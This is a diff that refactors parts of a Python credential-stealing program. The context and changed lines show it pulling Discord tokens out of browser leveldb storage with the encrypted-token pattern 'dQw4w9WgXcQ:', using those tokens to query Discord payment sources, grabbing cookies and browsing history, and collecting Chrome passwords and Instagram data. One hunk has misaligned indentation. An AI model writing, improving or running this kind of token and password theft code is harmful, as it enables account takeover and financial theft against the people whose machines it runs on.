@@ -58,11 +58,10 @@ def get_user_data(tk):
 
 def has_payment_methods(tk):
     headers = {"Authorization": tk}
-    response = get(
+    return get(
         "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
         headers=headers,
     ).json()
-    return response
 
 
 def cookies_grabber_mod(u):
@@ -114,16 +113,12 @@ def find_His():
                     for p in x___:
                         if x___.index(p) != len(x___) - 1:
                             b += f"{p}/"
-                    if len(b) <= 100:
-                        table.add_row([a, b])
-                    else:
-                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                 else:
                     b = f"{x_[0]}//{x___[0]}/[...]"
-                    if len(b) <= 100:
-                        table.add_row([a, b])
-                    else:
-                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+                if len(b) <= 100:
+                    table.add_row([a, b])
+                else:
+                    table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
     return table.get_string()
 
 
@@ -203,16 +198,14 @@ def main(dirpath):
                     pass
 
                 for file in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
-                    if not file.endswith(".ldb") and file.endswith(".log"):
-                        pass
-                    else:
+                    if file.endswith(".ldb") or not file.endswith(".log"):
                         try:
                             with open(
-                                os.path.join(path, "Local Storage", "leveldb", file),
-                                "r",
-                                errors="ignore",
-                            ) as files:
-                                for x in files.readlines():
+                                                            os.path.join(path, "Local Storage", "leveldb", file),
+                                                            "r",
+                                                            errors="ignore",
+                                                        ) as files:
+                                for x in files:
                                     x.strip()
                                     for values in findall(
                                         r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x
@@ -361,7 +354,7 @@ def main(dirpath):
     return [
         cleaned,
         list(set(t_lst)),
-        list(set(tuple(element) for element in insta_lst)),
+        list({tuple(element) for element in insta_lst}),
         all_data_p,
         chrome_psw_list,
         n_lst,
